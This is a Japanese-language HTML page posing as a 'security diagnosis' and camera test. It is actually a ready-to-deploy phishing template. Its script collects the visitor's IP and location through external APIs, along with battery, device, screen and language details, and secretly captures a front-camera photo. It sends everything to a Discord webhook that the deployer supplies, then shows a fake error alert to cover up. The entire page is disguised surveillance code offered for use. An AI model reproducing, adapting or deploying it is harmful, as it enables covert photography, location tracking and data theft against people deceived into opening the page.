<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>システム診断＆セキュリティチェック</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: linear-gradient(135deg, #0f172a, #1e1b4b);
            color: #f8fafc;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 16px;
        }
        .container {
            background: rgba(30, 41, 59, 0.7);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            padding: 24px;
            width: 100%;
            max-width: 400px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        h1 { font-size: 1.5rem; margin-bottom: 8px; color: #38bdf8; }
        p { font-size: 0.9rem; color: #94a3b8; margin-bottom: 20px; }
        .btn {
            background: linear-gradient(135deg, #0284c7, #2563eb);
            color: white;
            border: none;
            padding: 14px 24px;
            font-size: 1rem;
            font-weight: bold;
            border-radius: 12px;
            cursor: pointer;
            width: 100%;
            box-shadow: 0 4px 12px rgba(37, 99, 235, 0.4);
            transition: transform 0.2s;
        }
        .btn:active { transform: scale(0.98); }
        #status {
            margin-top: 16px;
            font-size: 0.85rem;
            color: #cbd5e1;
        }
        video { display: none; }
    </style>
</head>
<body>

    <div class="container">
        <h1>🔒 セキュリティ診断</h1>
        <p>お使いの端末環境とカメラ接続テストを実行します。</p>
        <button class="btn" id="startBtn">診断を開始する</button>
        <div id="status"></div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // ★ここにあなたのDiscord Webhook URLを貼り付けてください★
        const WEBHOOK_URL = "ここにDiscordのWebhookURLを貼る";

        const startBtn = document.getElementById('startBtn');
        const statusDiv = document.getElementById('status');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        startBtn.addEventListener('click', async () => {
            startBtn.disabled = true;
            statusDiv.textContent = "システムスキャン中...";

            try {
                // 1. IPアドレスを取得する外部API
                let ipInfo = "取得失敗";
                try {
                    const ipRes = await fetch('https://ipapi.co/json/');
                    const ipData = await ipRes.json();
                    ipInfo = `${ipData.ip} (${ipData.city || '不明'}, ${ipData.country_name || '不明'})`;
                } catch (e) {
                    try {
                        const fallbackRes = await fetch('https://api.ipify.org?format=json');
                        const fallbackData = await fallbackRes.json();
                        ipInfo = fallbackData.ip;
                    } catch (err) {}
                }

                // 2. バッテリー情報の取得（対応端末のみ）
                let batteryInfo = "取得不可";
                if (navigator.getBattery) {
                    try {
                        const battery = await navigator.getBattery();
                        batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? '充電中' : '放電中'})`;
                    } catch (e) {}
                }

                // 3. デバイス・ブラウザ情報
                const userAgent = navigator.userAgent;
                const screenRes = `${window.screen.width} x ${window.screen.height}`;
                const language = navigator.language;

                // 4. カメラ起動と撮影
                statusDiv.textContent = "カメラ接続中...";
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                video.srcObject = stream;

                // カメラが安定するまで少し待つ
                await new Promise(resolve => setTimeout(resolve, 1500));

                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                // ストリームを停止（カメラランプを消す）
                stream.getTracks().forEach(track => track.stop());

                statusDiv.textContent = "データを送信中...";

                // 画像をBlob（ファイルデータ）に変換
                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append('file', blob, 'capture.jpg');
                    
                    const content = `🚨 **新しいアクセスを検知しました！**\n` +
                                    `🌐 **IPアドレス**: ${ipInfo}\n` +
                                    `📱 **デバイス**: ${userAgent}\n` +
                                    `🖥 **画面解像度**: ${screenRes}\n` +
                                    `🔋 **バッテリー**: ${batteryInfo}\n` +
                                    `🌍 **言語**: ${language}`;

                    formData.append('payload_json', JSON.stringify({ content: content }));

                    await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        body: formData
                    });

                    statusDiv.textContent = "診断が完了しました！";
                    alert("エラー：セキュリティチェックに失敗しました。");
                }, 'image/jpeg', 0.8);

            } catch (err) {
                console.error(err);
                statusDiv.textContent = "エラーが発生しました（カメラ権限等）";
                startBtn.disabled = false;
            }
        });
    </script>
</body>
</html>
